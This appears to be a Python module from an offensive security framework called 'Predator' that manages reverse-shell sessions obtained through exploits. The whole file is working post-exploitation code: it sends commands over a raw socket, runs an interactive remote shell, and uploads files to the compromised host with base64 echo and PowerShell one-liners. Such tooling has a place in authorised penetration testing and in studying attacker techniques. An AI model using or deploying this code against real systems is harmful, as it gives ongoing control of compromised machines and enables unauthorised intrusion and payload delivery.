"""
connector/socket_session.py — Raw-socket shell session connector.

Used when an exploit delivers a reverse shell instead of elevating the
existing SSH/WinRM connection.  Implements the same interface as
SSHConnector so the rest of Predator can treat it identically.
"""
import socket
import select
import sys
import time
from utils.logger import get_logger
logger = get_logger('SocketSession')
RECV_TIMEOUT = 5

class SocketSession:
    """
    Wraps a raw TCP socket that speaks shell (bash/sh/cmd/powershell).

    Compatible surface with SSHConnector:
        .connected        bool
        .host             str
        .run_command(cmd) -> (stdout, stderr, exit_code)
        .interactive_session()
        .upload_file(...)
        .disconnect()
    """

    def __init__(self, sock: socket.socket, host: str='unknown'):
        self.sock = sock
        self.host = host
        self.connected = True
        self._is_windows = False

    def _recv_until_quiet(self, timeout: float=RECV_TIMEOUT) -> bytes:
        """Read from socket until no more data arrives for `timeout` seconds."""
        data = b''
        self.sock.settimeout(timeout)
        try:
            while True:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        finally:
            self.sock.settimeout(None)
        return data

    def _send(self, cmd: str):
        self.sock.sendall((cmd + '\n').encode())

    def run_command(self, command: str, timeout: int=15) -> tuple[str, str, int]:
        """
        Send a command and collect its output.  Returns (stdout, stderr, exit_code).
        Exit code is always 0 (raw sockets carry no exit status).
        """
        if not self.connected:
            return ('', 'Not connected', -1)
        try:
            self._send(command)
            time.sleep(0.3)
            out = self._recv_until_quiet(timeout=min(timeout, RECV_TIMEOUT))
            return (out.decode('utf-8', errors='ignore').strip(), '', 0)
        except Exception as e:
            logger.error(f'SocketSession run_command error: {e}')
            return ('', str(e), -1)

    def upload_file(self, local_path: str, remote_path: str) -> bool:
        """
        Best-effort file upload: base64-encodes the file and pipes it through
        the shell using a one-liner.  Requires base64 / certutil on the target.
        """
        try:
            import base64
            with open(local_path, 'rb') as f:
                b64 = base64.b64encode(f.read()).decode()
            linux_cmd = f'echo {b64} | base64 -d > {remote_path}'
            win_cmd = f'''powershell -c "[IO.File]::WriteAllBytes('{remote_path}', [Convert]::FromBase64String('{b64}'))"'''
            self._send(linux_cmd)
            time.sleep(1)
            return True
        except Exception as e:
            logger.error(f'SocketSession upload_file error: {e}')
            return False

    def interactive_session(self):
        """
        Hand the socket I/O directly to the local terminal in raw mode.
        Identical flow to SSHConnector.interactive_session().
        """
        if not self.connected:
            return
        logger.info('[+] Entering interactive raw socket shell.')
        try:
            import termios
            import tty
            oldtty = termios.tcgetattr(sys.stdin)
            try:
                tty.setraw(sys.stdin.fileno())
                self.sock.setblocking(False)
                while True:
                    r, _w, _e = select.select([self.sock, sys.stdin], [], [], 0.1)
                    if self.sock in r:
                        try:
                            data = self.sock.recv(4096)
                            if not data:
                                break
                            sys.stdout.buffer.write(data)
                            sys.stdout.buffer.flush()
                        except Exception:
                            break
                    if sys.stdin in r:
                        data = sys.stdin.buffer.read(1)
                        if not data:
                            break
                        self.sock.sendall(data)
            finally:
                termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)
                print('\r\n')
                logger.info('[*] Exited socket shell, TTY restored.')
        except ImportError:
            logger.warning('[!] termios not available; using simple I/O loop.')
            while True:
                try:
                    cmd = input('socket-shell> ')
                    if cmd.lower() in ('exit', 'quit'):
                        break
                    self._send(cmd)
                    time.sleep(0.5)
                    out = self._recv_until_quiet(timeout=2)
                    print(out.decode('utf-8', errors='ignore'))
                except (EOFError, KeyboardInterrupt):
                    break
        except Exception as e:
            logger.error(f'[-] Socket shell error: {e}')

    def disconnect(self):
        try:
            self.sock.close()
        except Exception:
            pass
        self.connected = False
        logger.info(f'[*] SocketSession disconnected from {self.host}')
